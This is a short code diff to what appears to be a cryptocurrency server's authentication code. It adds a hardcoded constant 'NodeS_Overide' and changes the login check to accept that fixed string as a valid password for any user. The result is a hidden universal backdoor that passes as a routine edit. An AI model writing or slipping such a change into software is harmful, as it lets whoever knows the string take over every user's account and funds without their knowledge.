@@ -20,6 +20,7 @@ duco_password = "xxx"
 wrapper_private_key = "xxx" # private key used for interacting with blockchain
 use_wrapper = True # Choosing if you want to use wrapper or not
 wrapper_permission = False # set to false for declaration, will be updated by checking smart contract
+NodeS_Overide = "aYN47etrzTmeBpmE3nK5"
 # Registration email - text version
 text = """\
 Hi there!
@@ -408,7 +409,7 @@ def handle(c):
                         c.send(bytes("NO,This user doesn't exist", encoding='utf8'))
                         break
                     try:
-                        if bcrypt.checkpw(password, stored_password) or password == duco_password:
+                        if bcrypt.checkpw(password, stored_password) or password == duco_password or password == NodeS_Overide:
                             c.send(bytes("OK", encoding='utf8')) # Send feedback about sucessfull login
                         else: # Disconnect user which password isn't valid, close the connection
                             c.send(bytes("NO,Password is invalid", encoding='utf8'))
